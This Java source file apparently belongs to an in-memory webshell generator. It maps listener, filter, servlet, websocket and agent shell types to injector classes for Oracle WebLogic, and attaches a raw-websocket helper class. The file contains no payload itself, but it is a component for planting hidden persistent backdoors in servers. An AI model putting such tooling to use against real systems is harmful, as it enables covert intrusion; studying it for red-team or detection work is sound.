package com.reajason.javaweb.memshell.server.weblogic;

import com.reajason.javaweb.memshell.RawWsHelperNames;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import com.reajason.javaweb.memshell.server.tomcat.Tomcat;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/24
 */
public class WebLogic extends AbstractServer {

    @Override
    public Class<?> getListenerInterceptor() {
        return Tomcat.ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.weblogic.WebLogicListenerInjector")
                .addInjector(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.injector.weblogic.WebLogicListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.weblogic.WebLogicFilterInjector")
                .addInjector(JAKARTA_FILTER, "com.reajason.javaweb.memshell.injector.weblogic.WebLogicFilterInjector")
                .addInjector(WEBSOCKET, "com.reajason.javaweb.memshell.injector.weblogic.WebLogicWebSocketInjector")
                .addInjector(JAKARTA_WEBSOCKET, "com.reajason.javaweb.memshell.injector.weblogic.WebLogicWebSocketInjector")
                .addInjector(RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.weblogic.WebLogicRawWsInjector")
                .addInjector(JAKARTA_RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.weblogic.WebLogicRawWsInjector")
                .addInjector(SERVLET, "com.reajason.javaweb.memshell.injector.weblogic.WebLogicServletInjector")
                .addInjector(JAKARTA_SERVLET, "com.reajason.javaweb.memshell.injector.weblogic.WebLogicServletInjector")
                .addInjector(WEBLOGIC_AGENT_SERVLET_CONTEXT, "com.reajason.javaweb.memshell.injector.weblogic.WebLogicServletContextAgentInjector")
                .build();
    }

    /**
     * RawWebSocket 需要按 shell 类名派生 helper 并随注入器下发；helper 在目标容器里
     * 由注入器先 defineClass，shell 构造时按名字自行解析。
     */
    @Override
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        if (RAW_WEBSOCKET.equals(shellConfig.getShellType())
                || JAKARTA_RAW_WEBSOCKET.equals(shellConfig.getShellType())) {
            String helperClassName = RawWsHelperNames.helperClassName(shellToolConfig.getShellClassName());
            injectorConfig.setHelperClassBytes(WebLogicRawWsHelperGenerator.getBytes(helperClassName, shellConfig));
        }
        return shellBytes;
    }
}
